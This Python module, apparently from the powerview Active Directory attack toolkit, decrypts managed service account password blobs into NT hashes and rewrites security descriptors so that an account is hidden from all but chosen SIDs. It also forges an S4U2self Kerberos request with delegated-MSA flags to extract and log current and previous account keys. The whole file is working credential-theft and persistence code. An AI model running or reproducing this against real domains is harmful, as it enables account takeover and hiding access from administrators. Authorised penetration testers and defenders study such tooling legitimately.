#!/usr/bin/env python3
from powerview.utils.accesscontrol import AccessControl
from powerview.utils.constants import MSDS_MANAGEDPASSWORD_BLOB
from Cryptodome.Hash import MD4
from impacket.ldap import ldaptypes
import logging
import binascii

from pyasn1.codec.der import decoder, encoder
from pyasn1.type.univ import noValue
from pyasn1.type import tag

from powerview.lib.krb5.asn1 import S4UUserID, PA_S4U_X509_USER, PA_DMSA_KEY_PACKAGE
from powerview.lib.krb5.constants import PreAuthenticationDataTypes
from impacket.krb5 import constants
from impacket.krb5.asn1 import AP_REQ, AS_REP, TGS_REQ, Authenticator, TGS_REP, seq_set, seq_set_iter, PA_FOR_USER_ENC, \
    Ticket as TicketAsn1, EncTGSRepPart, PA_PAC_OPTIONS, EncTicketPart
from impacket.krb5.crypto import _enctype_table, _get_checksum_profile, Cksumtype
from impacket.krb5.kerberosv5 import sendReceive
from impacket.krb5.types import Principal, KerberosTime, Ticket

import datetime
import random

class MSA:
	@staticmethod
	def decrypt(blob):
		blob = MSDS_MANAGEDPASSWORD_BLOB(blob)
		hash = MD4.new()
		hash.update(blob["CurrentPassword"][:-2])
		passwd = (
		    binascii.hexlify(hash.digest()).decode()
		)
		return passwd

	@staticmethod
	def read_acl(secDesc):
		return AccessControl.get_user_sid(secDesc)

	@staticmethod
	def create_msamembership(principal_sid: str):
		sd = AccessControl.create_empty_sd()
		acl = AccessControl.create_ace(principal_sid)
		sd['Dacl'].aces.append(acl)
		return sd.getData() 

	@staticmethod
	def set_hidden_secdesc(sec_desc: bytes, whitelisted_sids: list[str]):
		"""
		Change the ntSecurityDescriptor to only allow the principal to access the account
		"""
		sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=sec_desc)
		new_dacl = []
		for ace in sd['Dacl'].aces:
			if ace['Ace']['Sid'].formatCanonical() in whitelisted_sids or ace['AceType'] == ldaptypes.ACCESS_DENIED_OBJECT_ACE.ACE_TYPE:
				new_dacl.append(ace)
		sd['Dacl'].aces = new_dacl
		return sd.getData()

	@staticmethod
	def request_dmsa_st(tgt, cipher, oldSessionKey, sessionKey,kdcHost, domain, dmsa):
		decodedTGT = decoder.decode(tgt, asn1Spec=AS_REP())[0]
		# Extract the ticket from the TGT
		ticket = Ticket()
		ticket.from_asn1(decodedTGT['ticket'])

		apReq = AP_REQ()
		apReq['pvno'] = 5
		apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)

		opts = list()
		apReq['ap-options'] = constants.encodeFlags(opts)
		seq_set(apReq, 'ticket', ticket.to_asn1)

		authenticator = Authenticator()
		authenticator['authenticator-vno'] = 5
		authenticator['crealm'] = str(decodedTGT['crealm'])

		clientName = Principal()
		clientName.from_asn1(decodedTGT, 'crealm', 'cname')

		seq_set(authenticator, 'cname', clientName.components_to_asn1)

		now = datetime.datetime.now(datetime.timezone.utc)
		authenticator['cusec'] = now.microsecond
		authenticator['ctime'] = KerberosTime.to_asn1(now)

		encodedAuthenticator = encoder.encode(authenticator)

		# Key Usage 7
		# TGS-REQ PA-TGS-REQ padata AP-REQ Authenticator (includes
		# TGS authenticator subkey), encrypted with the TGS session
		# key (Section 5.5.1)
		encryptedEncodedAuthenticator = cipher.encrypt(sessionKey, 7, encodedAuthenticator, None)

		apReq['authenticator'] = noValue
		apReq['authenticator']['etype'] = cipher.enctype
		apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator

		encodedApReq = encoder.encode(apReq)

		tgsReq = TGS_REQ()

		tgsReq['pvno'] = 5
		tgsReq['msg-type'] = int(constants.ApplicationTagNumbers.TGS_REQ.value)

		tgsReq['padata'] = noValue
		tgsReq['padata'][0] = noValue
		tgsReq['padata'][0]['padata-type'] = int(PreAuthenticationDataTypes.PA_TGS_REQ.value)
		tgsReq['padata'][0]['padata-value'] = encodedApReq

		# In the S4U2self KRB_TGS_REQ/KRB_TGS_REP protocol extension, a service
		# requests a service ticket to itself on behalf of a user. The user is
		# identified to the KDC by the user's name and realm.
		clientName = Principal(dmsa, type=constants.PrincipalNameType.NT_PRINCIPAL.value)

		paencoded = None
		padatatype = None
		dmsa = True 

		nonce_value = random.getrandbits(31)
		dmsa_flags = [2, 4] # UNCONDITIONAL_DELEGATION (bit 2) | SIGN_REPLY (bit 4)
		encoded_flags = constants.encodeFlags(dmsa_flags)
		
		s4uID = S4UUserID()
		s4uID.setComponentByName('nonce', nonce_value)
		seq_set(s4uID, 'cname', clientName.components_to_asn1)
		s4uID.setComponentByName('crealm', domain) 
		s4uID.setComponentByName('options', encoded_flags)

		encoded_s4uid = encoder.encode(s4uID)
		checksum_profile = _get_checksum_profile(Cksumtype.SHA1_AES256)
		checkSum = checksum_profile.checksum(
			sessionKey, 
			constants.ApplicationTagNumbers.EncTGSRepPart.value,
			encoded_s4uid
		)

		s4uID_tagged = S4UUserID().subtype(explicitTag=tag.Tag(tag.tagClassContext, tag.tagFormatConstructed, 0))
		s4uID_tagged.setComponentByName('nonce', nonce_value)
		seq_set(s4uID_tagged, 'cname', clientName.components_to_asn1)
		s4uID_tagged.setComponentByName('crealm', domain) 
		s4uID_tagged.setComponentByName('options', encoded_flags)

		pa_s4u_x509_user = PA_S4U_X509_USER()
		pa_s4u_x509_user.setComponentByName('user-id', s4uID_tagged)
		pa_s4u_x509_user['checksum'] = noValue
		pa_s4u_x509_user['checksum']['cksumtype'] = Cksumtype.SHA1_AES256
		pa_s4u_x509_user['checksum']['checksum'] = checkSum

		padatatype = int(PreAuthenticationDataTypes.PA_S4U_X509_USER.value)
		paencoded = encoder.encode(pa_s4u_x509_user)

		tgsReq['padata'][1] = noValue
		tgsReq['padata'][1]['padata-type'] = padatatype
		tgsReq['padata'][1]['padata-value'] = paencoded

		reqBody = seq_set(tgsReq, 'req-body')

		opts = list()
		opts.append(constants.KDCOptions.forwardable.value)
		opts.append(constants.KDCOptions.renewable.value)
		opts.append(constants.KDCOptions.canonicalize.value)


		reqBody['kdc-options'] = constants.encodeFlags(opts)

		serverName = Principal('krbtgt/%s' % domain, type=constants.PrincipalNameType.NT_SRV_INST.value)

		seq_set(reqBody, 'sname', serverName.components_to_asn1)
		reqBody['realm'] = str(decodedTGT['crealm'])

		now = datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(days=1)

		reqBody['till'] = KerberosTime.to_asn1(now)
		reqBody['nonce'] = random.getrandbits(31)
		seq_set_iter(reqBody, 'etype',
					(int(cipher.enctype), int(constants.EncryptionTypes.rc4_hmac.value)))

		message = encoder.encode(tgsReq)

		r = sendReceive(message, domain, kdcHost)

		tgs = decoder.decode(r, asn1Spec=TGS_REP())[0]

		try:
			# Decrypt TGS-REP enc-part (Key Usage 8 - TGS_REP_EP_SESSION_KEY)
			cipher = _enctype_table[int(tgs['enc-part']['etype'])]
			plainText = cipher.decrypt(sessionKey, 8, tgs['enc-part']['cipher'])
			encTgsRepPart = decoder.decode(plainText, asn1Spec=EncTGSRepPart())[0]
			
			if 'encrypted_pa_data' not in encTgsRepPart or not encTgsRepPart['encrypted_pa_data']:
				logging.debug('No encrypted_pa_data found - DMSA key package not present')
				return
			
			for padata_entry in encTgsRepPart['encrypted_pa_data']:
				padata_type = int(padata_entry['padata-type'])
				logging.debug('Found encrypted padata type: %d (0x%x)' % (padata_type, padata_type))
				
				if padata_type == PreAuthenticationDataTypes.PA_DMSA_KEY_PACKAGE.value:
					dmsa_key_package = decoder.decode(
						padata_entry['padata-value'], 
						asn1Spec=PA_DMSA_KEY_PACKAGE()
					)[0]
					dmsa_key_package.prettyPrint()
					
					logging.info('Current keys:')
					for key in dmsa_key_package['current-keys']:
						key_type = int(key['keytype'])
						key_value = bytes(key['keyvalue'])
						type_name = constants.EncryptionTypes(key_type)
						hex_key = binascii.hexlify(key_value).decode('utf-8')
						logging.info('%s:%s' % (type_name, hex_key))
					logging.info('Previous keys:')
					previous_keys = []
					for key in dmsa_key_package['previous-keys']:
						key_type = int(key['keytype'])
						key_value = bytes(key['keyvalue'])
						type_name = constants.EncryptionTypes(key_type)
						hex_key = binascii.hexlify(key_value).decode('utf-8')
						logging.info('%s:%s' % (type_name, hex_key))
						previous_keys.append({type_name : hex_key})
		except Exception as e:
			logging.error(f"Error requesting DMSA ST: {e}")
			return None, None, None, None, None

		return r, None, sessionKey, None, previous_keys